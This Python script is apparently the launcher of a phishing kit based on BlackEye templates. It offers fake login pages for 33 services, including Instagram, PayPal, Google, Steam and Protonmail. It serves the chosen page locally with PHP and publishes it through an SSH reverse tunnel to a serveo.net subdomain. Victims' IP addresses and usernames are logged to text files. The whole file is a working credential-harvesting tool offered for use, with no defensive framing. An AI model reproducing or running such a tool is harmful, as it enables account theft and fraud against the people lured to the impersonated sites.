def run():
    import subprocess

    class colors:
        BLACK  = '\33[30m'
        RED    = '\33[31m'
        GREEN  = '\33[32m'
        YELLOW = '\33[33m'
        BLUE   = '\33[34m'
        VIOLET = '\33[35m'
        BEIGE  = '\33[36m'
        WHITE  = '\33[37m'
        BLACKBG  = '\33[40m'
        REDBG    = '\33[41m'
        GREENBG  = '\33[42m'
        YELLOWBG = '\33[43m'
        BLUEBG   = '\33[44m'
        VIOLETBG = '\33[45m'
        BEIGEBG  = '\33[46m'
        WHITEBG  = '\33[47m'
        END      = '\33[0m'

    try:
        print("""
    Credit to @thelinuxchoice for BlackEye's base sites.
                        Available Templates

    [1] Instagram          [2] Facebook            [3] Snapchat
    [4] Twitter            [5] GitHub              [6] Google
    [7] Spotify            [8] Netflix             [9] PayPal
    [10] Origin            [11] Steam              [12] Yahoo!
    [13] LinkedIn          [14] Protonmail         [15] Wordpress
    [16] Microsoft         [17] IGFollowers        [18] eBay
    [19] Pinterest         [20] CryptoCurrency     [21] Verizon
    [22] DropBox           [23] Adobe ID           [24] Shopify
    [25] FB Messenger      [26] GitLab             [27] Twitch
    [28] MySpace           [29] Badoo              [30] VK
    [31] Yandex            [32] devianART          [33] Custom

    Please Choose A Number To Host Template:
        """)
        templates = {
        '1': 'instagram',
        '2': 'facebook',
        '3': 'snapchat',
        '4': 'twitter',
        '5': 'github',
        '6': 'google',
        '7': 'spotify',
        '8': 'netflix',
        '9': 'paypal',
        '10': 'origin',
        '11': 'steam',
        '12': 'yahoo',
        '13': 'linkedin',
        '14': 'protonmail',
        '15': 'wordpress',
        '16': 'microsoft',
        '17': 'igfollowers',
        '18': 'ebay',
        '19': 'pinterest',
        '20': 'cryptocurrency',
        '21': 'verizon',
        '22': 'dropbox',
        '23': 'adobeid',
        '24': 'shopify',
        '25': 'fbmessenger',
        '26': 'gitlab',
        '27': 'twitch',
        '28': 'myspace',
        '29': 'badoo',
        '30': 'vk',
        '31': 'yandex',
        '32': 'devianart',
        '33': 'create'
        }
        number = input("[" + "?" + "]" + "> ")
        if number == "18":
            print("Ebay Currently Does Not Work. Choose Another..")
            exit()
        else:
            pass
        choice = templates[number]
        print("Loading %s" % (choice))
        print("\nEnter A Custom Subdomain")
        subdom = input("[" + "?" + "]" + "> ")
        print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
        print("Logs Can Be Found In sites/%s/ip.txt and sites/%s/usernames.txt" % (choice, choice) + colors.END)
        cmd_line = "php -t sites/%s -S 127.0.0.1:80 & ssh -R %s.serveo.net:80:127.0.0.1:80 serveo.net" % (choice, subdom)
        p = subprocess.Popen(cmd_line, shell=True)
        p.communicate()[0]


    except KeyboardInterrupt:
        pass
